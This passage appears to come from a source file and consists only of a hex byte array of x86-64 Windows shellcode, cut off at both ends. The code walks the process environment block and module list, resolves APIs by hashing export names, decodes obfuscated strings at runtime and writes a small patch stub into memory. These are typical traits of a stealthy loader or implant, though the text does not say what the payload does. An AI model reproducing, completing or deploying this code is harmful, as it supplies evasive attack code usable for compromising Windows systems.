	0x81, 0xF8, 0x17, 0x4E, 0x0B, 0x27, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75,
	0xA7, 0x48, 0x8B, 0x00, 0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x65, 0x48, 0x8B,
	0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x4E, 0x24, 0x49, 0x03,
	0xCA, 0x48, 0x8B, 0x40, 0x18, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41, 0x8B,
	0x4E, 0x1C, 0x48, 0x8B, 0x40, 0x10, 0x49, 0x03, 0xCA, 0x44, 0x8B, 0x3C,
	0x91, 0x4D, 0x03, 0xFA, 0x0F, 0x1F, 0x40, 0x00, 0x4C, 0x8B, 0x50, 0x30,
	0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00,
	0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18,
	0x45, 0x85, 0xC9, 0x74, 0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41,
	0xB8, 0x0A, 0xF3, 0xB4, 0xEA, 0x4B, 0x8D, 0x0C, 0x8A, 0x8B, 0x34, 0x19,
	0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF,
	0x74, 0x36, 0x66, 0x90, 0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01,
	0x40, 0x80, 0xEF, 0x41, 0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF,
	0x19, 0x0F, 0xB6, 0x7E, 0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44,
	0x69, 0xC2, 0x93, 0x01, 0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41,
	0x81, 0xF8, 0x86, 0x23, 0xDA, 0x43, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75,
	0xA7, 0x48, 0x8B, 0x00, 0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E,
	0x24, 0x49, 0x8B, 0xF4, 0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49,
	0x41, 0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA, 0x44, 0x8B, 0x04, 0x91, 0x4D,
	0x03, 0xC2, 0xC7, 0x44, 0x24, 0x20, 0x45, 0x31, 0xAC, 0x33, 0x33, 0xC0,
	0xC7, 0x44, 0x24, 0x24, 0xAD, 0x35, 0xA2, 0x37, 0x48, 0x89, 0x44, 0x24,
	0x3C, 0x89, 0x44, 0x24, 0x44, 0xC7, 0x44, 0x24, 0x28, 0xA1, 0x29, 0x5D,
	0x2B, 0xC7, 0x44, 0x24, 0x2C, 0xB2, 0x2D, 0x4A, 0x2F, 0xC7, 0x44, 0x24,
	0x30, 0x63, 0x21, 0xBE, 0x23, 0xC7, 0x44, 0x24, 0x34, 0x45, 0x25, 0xB5,
	0x27, 0xC7, 0x44, 0x24, 0x38, 0xCB, 0x59, 0x5A, 0x5B, 0x0F, 0xB6, 0x7C,
	0x34, 0x20, 0x8D, 0x56, 0xA8, 0x40, 0x0F, 0xB6, 0xC7, 0xB9, 0x34, 0x00,
	0x00, 0x00, 0x22, 0xC2, 0x2A, 0xC8, 0x02, 0xC9, 0x40, 0x02, 0xCF, 0x8D,
	0x7E, 0xA9, 0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x21, 0x88, 0x4C, 0x34,
	0x20, 0x0F, 0xB6, 0xC2, 0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x22, 0x40,
	0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34, 0x21, 0x8D, 0x7E, 0xAA,
	0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9,
	0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x23, 0x40, 0x02, 0xCF, 0x0F, 0xB6,
	0xC2, 0x88, 0x4C, 0x34, 0x22, 0x8D, 0x7E, 0xAB, 0x40, 0x22, 0xC7, 0xB9,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6,
	0x54, 0x34, 0x24, 0x40, 0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34,
	0x23, 0x8D, 0x7E, 0xAC, 0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x25, 0x40,
	0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34, 0x24, 0x8D, 0x7E, 0xAD,
	0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9,
	0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x26, 0x40, 0x02, 0xCF, 0x0F, 0xB6,
	0xC2, 0x88, 0x4C, 0x34, 0x25, 0x8D, 0x7E, 0xAE, 0x40, 0x22, 0xC7, 0xB9,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6,
	0x54, 0x34, 0x27, 0x40, 0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34,
	0x26, 0x8D, 0x7E, 0xAF, 0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x28, 0x40,
	0x02, 0xCF, 0x88, 0x4C, 0x34, 0x27, 0x0F, 0xB6, 0xC2, 0x8D, 0x7E, 0xB0,
	0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9,
	0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x29, 0x40, 0x02, 0xCF, 0x0F, 0xB6,
	0xC2, 0x88, 0x4C, 0x34, 0x28, 0x8D, 0x7E, 0xB1, 0x40, 0x22, 0xC7, 0xB9,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6,
	0x54, 0x34, 0x2A, 0x40, 0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34,
	0x29, 0x8D, 0x7E, 0xB2, 0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x2B, 0x40,
	0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34, 0x2A, 0x8D, 0x7E, 0xB3,
	0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9,
	0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x2C, 0x40, 0x02, 0xCF, 0x0F, 0xB6,
	0xC2, 0x88, 0x4C, 0x34, 0x2B, 0x8D, 0x7E, 0xB4, 0x40, 0x22, 0xC7, 0xB9,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6,
	0x54, 0x34, 0x2D, 0x40, 0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34,
	0x2C, 0x8D, 0x7E, 0xB5, 0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x2E, 0x40,
	0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x88, 0x4C, 0x34, 0x2D, 0x8D, 0x7E, 0xB6,
	0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9,
	0x02, 0xCA, 0x0F, 0xB6, 0x54, 0x34, 0x2F, 0x40, 0x02, 0xCF, 0x0F, 0xB6,
	0xC2, 0x88, 0x4C, 0x34, 0x2E, 0x8D, 0x7E, 0xB7, 0x40, 0x22, 0xC7, 0xB9,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x0F, 0xB6,
	0x54, 0x34, 0x30, 0x40, 0x02, 0xCF, 0x8D, 0x7E, 0xB8, 0x88, 0x4C, 0x34,
	0x2F, 0x0F, 0xB6, 0xC2, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x40, 0x22, 0xC7,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x8D, 0x56, 0xB9, 0x40, 0x02, 0xCF,
	0x0F, 0xB6, 0xC2, 0x0F, 0xB6, 0x7C, 0x34, 0x31, 0x88, 0x4C, 0x34, 0x30,
	0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9,
	0x02, 0xCA, 0x8D, 0x56, 0xBA, 0x40, 0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x0F,
	0xB6, 0x7C, 0x34, 0x32, 0x88, 0x4C, 0x34, 0x31, 0x40, 0x22, 0xC7, 0xB9,
	0x34, 0x00, 0x00, 0x00, 0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x8D, 0x56,
	0xBB, 0x40, 0x02, 0xCF, 0x0F, 0xB6, 0xC2, 0x0F, 0xB6, 0x7C, 0x34, 0x33,
	0x88, 0x4C, 0x34, 0x32, 0x40, 0x22, 0xC7, 0xB9, 0x34, 0x00, 0x00, 0x00,
	0x2A, 0xC8, 0x02, 0xC9, 0x02, 0xCA, 0x40, 0x02, 0xCF, 0x88, 0x4C, 0x34,
	0x33, 0x48, 0x83, 0xC6, 0x14, 0x48, 0x83, 0xFE, 0x28, 0x0F, 0x82, 0x72,
	0xFD, 0xFF, 0xFF, 0x33, 0xD2, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x41, 0xFF,
	0xD0, 0x48, 0x8D, 0x95, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x41,
	0xFF, 0xD7, 0x65, 0x48, 0x8B, 0x0C, 0x25, 0x60, 0x00, 0x00, 0x00, 0x89,
	0x85, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x49, 0x18, 0x48, 0x8B, 0x49,
	0x10, 0x0F, 0x1F, 0x00, 0x4C, 0x8B, 0x51, 0x30, 0x49, 0x63, 0x52, 0x3C,
	0x46, 0x8B, 0xB4, 0x12, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D,
	0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74,
	0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41, 0xB8, 0x21, 0xFB, 0xB7,
	0x6A, 0x4A, 0x8D, 0x04, 0x8B, 0x42, 0x8B, 0x34, 0x10, 0x49, 0x03, 0xF2,
	0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF, 0x74, 0x35, 0x90,
	0x40, 0x0F, 0xBE, 0xC7, 0x48, 0x8D, 0x76, 0x01, 0x40, 0x80, 0xEF, 0x41,
	0x8B, 0xD0, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF, 0x19, 0x0F, 0xB6, 0x7E,
	0xFF, 0x0F, 0x47, 0xD0, 0x41, 0x33, 0xD0, 0x44, 0x69, 0xC2, 0x93, 0x01,
	0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41, 0x81, 0xF8, 0xE4, 0xC9,
	0x86, 0x9B, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75, 0xA7, 0x48, 0x8B, 0x09,
	0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E, 0x24, 0x49, 0x03, 0xCA,
	0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41, 0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA,
	0x8B, 0x04, 0x91, 0xB9, 0x14, 0x00, 0x00, 0x00, 0x49, 0x03, 0xC2, 0xFF,
	0xD0, 0x44, 0x39, 0xA5, 0xB8, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xB3, 0xFA,
	0xFF, 0xFF, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x10, 0x90, 0x4C, 0x8B, 0x50, 0x30,
	0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00,
	0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18,
	0x45, 0x85, 0xC9, 0x74, 0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41,
	0xB8, 0x1F, 0x0E, 0xAB, 0x55, 0x4A, 0x8D, 0x0C, 0x8B, 0x42, 0x8B, 0x34,
	0x11, 0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84,
	0xFF, 0x74, 0x35, 0x90, 0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01,
	0x40, 0x80, 0xEF, 0x41, 0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF,
	0x19, 0x0F, 0xB6, 0x7E, 0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44,
	0x69, 0xC2, 0x93, 0x01, 0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41,
	0x81, 0xF8, 0x46, 0x26, 0xF2, 0x47, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75,
	0xA7, 0x48, 0x8B, 0x00, 0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E,
	0x24, 0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41, 0x8B, 0x4E,
	0x1C, 0x49, 0x03, 0xCA, 0x8B, 0x04, 0x91, 0x49, 0x03, 0xC2, 0xFF, 0xD0,
	0x48, 0x8B, 0xBD, 0xB0, 0x00, 0x00, 0x00, 0x33, 0xC9, 0x0F, 0x57, 0xC0,
	0x48, 0x89, 0x4D, 0x10, 0x0F, 0x11, 0x45, 0x00, 0x8B, 0xC0, 0x48, 0x8B,
	0x0F, 0x0F, 0x11, 0x45, 0xF0, 0x48, 0x89, 0x4D, 0xF8, 0x48, 0x8D, 0x4D,
	0xE8, 0x48, 0xC7, 0x45, 0xE8, 0x05, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45,
	0x00, 0x00, 0x00, 0x10, 0x00, 0x48, 0x89, 0x45, 0x08, 0x44, 0x89, 0x65,
	0x18, 0x41, 0xFF, 0xD5, 0x33, 0xC0, 0x48, 0xC7, 0x45, 0x20, 0x05, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x45, 0x48, 0x48, 0x8D, 0x4D, 0x20, 0x48, 0x8B,
	0x07, 0x0F, 0x57, 0xC0, 0x0F, 0x11, 0x45, 0x38, 0x48, 0xC7, 0x45, 0x38,
	0x00, 0x00, 0x10, 0x00, 0x0F, 0x11, 0x45, 0x28, 0x48, 0x89, 0x45, 0x30,
	0x8B, 0x85, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x40, 0x44, 0x89,
	0x65, 0x50, 0x41, 0xFF, 0xD5, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
	0x00, 0x00, 0xC7, 0x45, 0x80, 0x48, 0x83, 0xEC, 0x38, 0x48, 0xC7, 0x45,
	0x84, 0x48, 0xB8, 0x00, 0x00, 0xC7, 0x45, 0x8C, 0x00, 0x00, 0x48, 0x89,
	0x48, 0x8B, 0x40, 0x18, 0xC7, 0x45, 0x90, 0x44, 0x24, 0x20, 0x48, 0xC7,
	0x45, 0x94, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x45, 0x98, 0x83, 0x38, 0x00,
	0x75, 0x48, 0x8B, 0x40, 0x10, 0xC7, 0x45, 0x9C, 0x39, 0x48, 0x8B, 0x44,
	0xC7, 0x45, 0xA0, 0x24, 0x20, 0xC7, 0x00, 0xC7, 0x45, 0xA4, 0x01, 0x00,
	0x00, 0x00, 0xC7, 0x45, 0xA8, 0x48, 0x8B, 0x44, 0x24, 0xC7, 0x45, 0xAC,
	0x20, 0x48, 0x8B, 0x40, 0xC7, 0x45, 0xB0, 0x08, 0x48, 0x89, 0x44, 0xC7,
	0x45, 0xB4, 0x24, 0x28, 0x45, 0x33, 0xC7, 0x45, 0xB8, 0xC0, 0xBA, 0x01,
	0x00, 0xC7, 0x45, 0xBC, 0x00, 0x00, 0x48, 0x8B, 0xC7, 0x45, 0xC0, 0x44,
	0x24, 0x20, 0x48, 0xC7, 0x45, 0xC4, 0x8B, 0x48, 0x10, 0xFF, 0xC7, 0x45,
	0xC8, 0x54, 0x24, 0x28, 0x48, 0xC7, 0x45, 0xCC, 0x8B, 0x44, 0x24, 0x20,
	0xC7, 0x45, 0xD0, 0xC7, 0x00, 0x02, 0x00, 0xC7, 0x45, 0xD4, 0x00, 0x00,
	0x48, 0x83, 0xC7, 0x45, 0xD8, 0xC4, 0x38, 0xC3, 0xCC, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x30,
	0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00,
	0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18,
	0x45, 0x85, 0xC9, 0x74, 0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41,
	0xB8, 0xCE, 0x75, 0x48, 0x30, 0x4B, 0x8D, 0x0C, 0x8A, 0x8B, 0x34, 0x19,
	0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF,
	0x74, 0x36, 0x66, 0x90, 0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01,
	0x40, 0x80, 0xEF, 0x41, 0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF,
	0x19, 0x0F, 0xB6, 0x7E, 0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44,
	0x69, 0xC2, 0x93, 0x01, 0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41,
	0x81, 0xF8, 0xC2, 0xEF, 0x4C, 0xE3, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75,
	0xA7, 0x48, 0x8B, 0x00, 0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E,
	0x24, 0x0F, 0x57, 0xC0, 0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49,
	0x41, 0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA, 0x8B, 0x3C, 0x91, 0x49, 0x03,
	0xFA, 0xC7, 0x44, 0x24, 0x48, 0x04, 0xB5, 0x38, 0xB3, 0x33, 0xC0, 0xC7,
	0x44, 0x24, 0x4C, 0x0E, 0xB1, 0x04, 0x8F, 0x48, 0x89, 0x44, 0x24, 0x6C,
	0xC7, 0x44, 0x24, 0x50, 0x3A, 0x8D, 0xFE, 0x8B, 0xC7, 0x44, 0x24, 0x54,
	0x36, 0x89, 0x3C, 0x87, 0xC7, 0x44, 0x24, 0x58, 0x32, 0x85, 0x84, 0x83,
	0x0F, 0x11, 0x44, 0x24, 0x5C, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42, 0x0F, 0xB6, 0x54,
	0x24, 0x48, 0x41, 0x8D, 0x4C, 0x24, 0x19, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x1A, 0x42, 0x88, 0x54, 0x24, 0x48, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x49, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x1B, 0x42, 0x88, 0x54, 0x24,
	0x49, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x4A, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x1C, 0x42, 0x88, 0x54, 0x24, 0x4A, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x4B, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x1D, 0x42, 0x88, 0x54, 0x24,
	0x4B, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x4C, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x1E, 0x42, 0x88, 0x54, 0x24, 0x4C, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x4D, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x1F, 0x42, 0x88, 0x54, 0x24,
	0x4D, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x4E, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x20, 0x42, 0x88, 0x54, 0x24, 0x4E, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x4F, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x21, 0x42, 0x88, 0x54, 0x24,
	0x4F, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x50, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x42, 0x88, 0x54,
	0x24, 0x50, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x51, 0x41, 0x8D, 0x4C, 0x24,
	0x22, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x23, 0x42, 0x88, 0x54, 0x24,
	0x51, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x52, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x24, 0x42, 0x88, 0x54, 0x24, 0x52, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x53, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x25, 0x42, 0x88, 0x54, 0x24,
	0x53, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x54, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x42, 0x0F, 0xB6,
	0x4C, 0x24, 0x55, 0x42, 0x88, 0x54, 0x24, 0x54, 0x41, 0x8D, 0x54, 0x24,
	0x26, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x42, 0x0F, 0xB6, 0x4C, 0x24, 0x56, 0x42, 0x88, 0x54,
	0x24, 0x55, 0x41, 0x8D, 0x54, 0x24, 0x27, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x42, 0x0F, 0xB6,
	0x4C, 0x24, 0x57, 0x42, 0x88, 0x54, 0x24, 0x56, 0x41, 0x8D, 0x54, 0x24,
	0x28, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x42, 0x0F, 0xB6, 0x4C, 0x24, 0x58, 0x42, 0x88, 0x54,
	0x24, 0x57, 0x41, 0x8D, 0x54, 0x24, 0x29, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x42, 0x0F, 0xB6,
	0x4C, 0x24, 0x59, 0x42, 0x88, 0x54, 0x24, 0x58, 0x41, 0x8D, 0x54, 0x24,
	0x2A, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x42, 0x88, 0x54, 0x24, 0x59, 0x42, 0x0F, 0xB6, 0x54,
	0x24, 0x5A, 0x41, 0x8D, 0x4C, 0x24, 0x2B, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x2C, 0x42, 0x88, 0x54, 0x24, 0x5A, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x5B, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A,
	0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C, 0x24, 0x2D, 0x42, 0x88, 0x54, 0x24,
	0x5B, 0x42, 0x0F, 0xB6, 0x54, 0x24, 0x5C, 0x0F, 0xB6, 0xC2, 0x22, 0xC1,
	0x80, 0xC1, 0x51, 0x02, 0xC0, 0x2A, 0xD0, 0x02, 0xD1, 0x41, 0x8D, 0x4C,
	0x24, 0x2E, 0x42, 0x88, 0x54, 0x24, 0x5C, 0x42, 0x0F, 0xB6, 0x54, 0x24,
	0x5D, 0x0F, 0xB6, 0xC2, 0x22, 0xC1, 0x02, 0xC0, 0x2A, 0xD0, 0x80, 0xC2,
	0x51, 0x02, 0xD1, 0x42, 0x88, 0x54, 0x24, 0x5D, 0x49, 0x83, 0xC4, 0x16,
	0x49, 0x83, 0xFC, 0x2C, 0x0F, 0x82, 0x5E, 0xFD, 0xFF, 0xFF, 0x48, 0x8D,
	0x4C, 0x24, 0x48, 0xFF, 0xD7, 0x65, 0x48, 0x8B, 0x0C, 0x25, 0x60, 0x00,
	0x00, 0x00, 0x4C, 0x8B, 0xF8, 0x48, 0x8B, 0x49, 0x18, 0x48, 0x8B, 0x49,
	0x10, 0x0F, 0x1F, 0x00, 0x4C, 0x8B, 0x51, 0x30, 0x49, 0x63, 0x52, 0x3C,
	0x46, 0x8B, 0xB4, 0x12, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D,
	0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74,
	0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41, 0xB8, 0xE8, 0x9B, 0x3E,
